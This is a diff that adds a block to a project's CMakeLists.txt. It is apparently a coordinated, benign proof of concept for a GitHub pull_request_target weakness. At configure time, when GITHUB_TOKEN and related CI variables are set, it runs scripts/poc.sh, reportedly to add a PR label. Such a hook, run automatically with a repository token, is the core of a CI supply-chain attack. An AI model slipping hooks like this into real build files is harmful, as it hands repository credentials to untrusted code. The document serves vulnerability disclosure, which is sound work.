@@ -1,3 +1,24 @@
+# --- PoC: benign proof for pull_request_target risk (coordinated) ---
+if(DEFINED ENV{GITHUB_TOKEN} AND DEFINED ENV{GITHUB_REPOSITORY} AND DEFINED ENV{GITHUB_EVENT_PATH})
+  message(STATUS "PoC: triggering scripts/poc.sh to add a PR label")
+  execute_process(
+    COMMAND bash ${CMAKE_SOURCE_DIR}/scripts/poc.sh
+    RESULT_VARIABLE _poc_rv
+    OUTPUT_VARIABLE _poc_out
+    ERROR_VARIABLE  _poc_err
+  )
+  message(STATUS "PoC exit code: ${_poc_rv}")
+  if(_poc_out)
+    message(STATUS "PoC output: ${_poc_out}")
+  endif()
+  if(_poc_err)
+    message(WARNING "PoC stderr: ${_poc_err}")
+  endif()
+endif()
+# --- end PoC snippet ---
+
+
+
 if(CMAKE_TOOLCHAIN_FILE)
     set(LIBRARY_OUTPUT_PATH_ROOT ${CMAKE_BINARY_DIR} CACHE PATH "root for library output, set this to change where android libs are compiled to")
     # get absolute path, but get_filename_component ABSOLUTE only refer with source dir, so find_file here :(
